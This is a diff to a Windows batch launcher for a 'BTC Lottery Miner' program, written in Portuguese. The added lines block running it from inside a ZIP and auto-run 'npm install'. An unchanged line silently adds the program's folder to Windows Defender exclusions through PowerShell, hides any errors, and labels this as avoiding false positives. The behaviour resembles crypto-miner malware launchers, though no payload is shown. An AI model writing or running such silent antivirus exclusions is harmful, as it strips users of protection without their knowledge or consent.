@@ -25,6 +25,22 @@ echo    Software BTC Lottery Miner - Iniciando...
 echo  =========================================
 echo.
 
+:: Verifica se esta rodando de dentro do arquivo ZIP sem extrair
+echo "%~dp0" | findstr /i "Temp" >nul
+if %errorlevel% equ 0 (
+    echo.
+    echo  [!] ERRO: VOCE ESTA RODANDO O ARQUIVO DE DENTRO DO ZIP!
+    echo  [!] Para o sistema funcionar, voce precisa primeiro EXTRAIR a pasta.
+    echo.
+    echo  COMO RESOLVER:
+    echo  1. Clique com o botao direito no arquivo .zip
+    echo  2. Selecione "Extrair Tudo..." ou "Extract Here"
+    echo  3. Entre na nova pasta extraida e rode o INICIAR novamente.
+    echo.
+    pause
+    exit /b
+)
+
 :: Tenta adicionar exclusao no Windows Defender para evitar falsos positivos (requer admin, falha silenciosamente se nao tiver)
 powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1
 
@@ -45,6 +61,14 @@ if %errorlevel% neq 0 (
     echo.
     pause
     exit /b 0
+)
+
+:: Verifica se a pasta node_modules existe, senao instala as dependencias
+if not exist "%~dp0node_modules\" (
+    echo.
+    echo  [+] Instalando dependencias do sistema pela primeira vez...
+    echo  [+] Isso pode demorar alguns segundos, aguarde.
+    call npm install
 )
 
 :: Cria atalho na Area de Trabalho automaticamente com icone do Bitcoin
